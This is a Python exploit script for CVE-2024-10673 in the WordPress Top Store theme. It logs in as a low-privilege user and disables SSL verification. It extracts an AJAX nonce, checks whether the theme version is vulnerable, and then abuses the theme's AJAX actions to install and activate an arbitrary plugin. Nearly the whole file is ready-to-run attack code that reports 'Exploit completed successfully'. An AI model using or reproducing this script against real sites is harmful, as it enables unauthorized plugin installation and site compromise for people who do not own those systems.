import requests
import argparse
import re
import json

# By Nxploit | Khaled Alenazi 

def disable_ssl_verification():
    requests.packages.urllib3.disable_warnings()
    session.verify = False  # Ignore SSL verification

def login(url, username, password):
    login_url = f"{url}/wp-login.php"
    login_data = {
        "log": username,
        "pwd": password,
        "rememberme": "forever",
        "wp-submit": "Log In"
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    response = session.post(login_url, data=login_data, headers=headers, allow_redirects=True)
    if any("wordpress_logged_in" in cookie.name for cookie in session.cookies):
        return {"status": "success", "message": "Logged in successfully"}
    else:
        return {"status": "error", "message": "Login failed. Check credentials."}

def fetch_nonce(url):
    nonce_page_url = f"{url}/wp-admin/themes.php?page=thunk_started"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    nonce_response = session.get(nonce_page_url, headers=headers)
    nonce_match = re.search(r'var _wpUpdatesSettings = {"ajax_nonce":"(.*?)"};', nonce_response.text)
    if nonce_match:
        return {"status": "success", "message": "Nonce extracted", "nonce": nonce_match.group(1)}
    else:
        return {"status": "error", "message": "Failed to extract nonce"}

def check_plugin_version(url):
    readme_url = f"{url}/wp-content/themes/top-store/readme.txt"
    response = session.get(readme_url)
    if response.status_code == 200:
        version_match = re.search(r'Stable tag: (\d+\.\d+\.\d+)', response.text)
        if version_match:
            version = version_match.group(1)
            if version <= "1.5.4":  # Compare with the vulnerable version
                return {"status": "success", "message": f"Vulnerable version detected: {version}"}
            else:
                return {"status": "info", "message": f"Non-vulnerable version detected: {version}"}
        else:
            return {"status": "error", "message": "Version information not found in readme.txt"}
    else:
        return {"status": "error", "message": f"Failed to fetch readme.txt, status code: {response.status_code}"}

def install_plugin(url, plugin_slug, nonce):
    admin_ajax_url = f"{url}/wp-admin/admin-ajax.php"
    plugin_init = f"{plugin_slug}/{plugin_slug}.php"
    install_data = {
        "action": "install-plugin",
        "slug": plugin_slug,
        "init": plugin_init,
        "_ajax_nonce": nonce,
        "_fs_nonce": "",
        "username": "",
        "password": "",
        "connection_type": "",
        "public_key": "",
        "private_key": ""
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    install_response = session.post(admin_ajax_url, data=install_data, headers=headers)
    if '"success":true' in install_response.text:
        return {"status": "success", "message": f"Plugin {plugin_slug} installed successfully"}
    else:
        return {"status": "error", "message": "Plugin installation failed", "response": install_response.text}

def activate_plugin(url, plugin_slug):
    admin_ajax_url = f"{url}/wp-admin/admin-ajax.php"
    plugin_init = f"{plugin_slug}/{plugin_slug}.php"
    activate_data = {
        "action": "th_activeplugin",
        "slug": plugin_slug,
        "init": plugin_init
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "*/*",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest"
    }
    activate_response = session.post(admin_ajax_url, data=activate_data, headers=headers)
    if '"success":true' in activate_response.text:
        return {"status": "success", "message": f"Plugin {plugin_slug} activated successfully"}
    else:
        return {"status": "error", "message": "Plugin activation failed", "response": activate_response.text}

def main():
    parser = argparse.ArgumentParser(description="Exploit CVE-2024-10673 - WordPress Plugin Installation & Activation by : # By Nxploit | Khaled Alenazi ")
    parser.add_argument("-u", "--url", required=True, help="Target WordPress URL (e.g., http://192.168.100.74:888/wordpress)")
    parser.add_argument("-un", "--username", required=True, help="WordPress Username")
    parser.add_argument("-p", "--password", required=True, help="WordPress Password")
    parser.add_argument("-pl", "--plugin", default="hunk-companion", help="Plugin slug to install and activate (default: hunk-companion)")
    args = parser.parse_args()

    disable_ssl_verification()

    login_result = login(args.url, args.username, args.password)
    print(json.dumps(login_result))
    if login_result["status"] != "success":
        return

    nonce_result = fetch_nonce(args.url)
    print(json.dumps(nonce_result))
    if nonce_result["status"] != "success":
        return

    version_result = check_plugin_version(args.url)
    print(json.dumps(version_result))
    if version_result["status"] != "success":
        return

    install_result = install_plugin(args.url, args.plugin, nonce_result["nonce"])
    print(json.dumps(install_result))
    if install_result["status"] != "success":
        return

    activate_result = activate_plugin(args.url, args.plugin)
    print(json.dumps(activate_result))
    if activate_result["status"] != "success":
        return

    print(json.dumps({"status": "success", "message": "Exploit completed successfully!"}))

if __name__ == "__main__":
    session = requests.Session()
    main()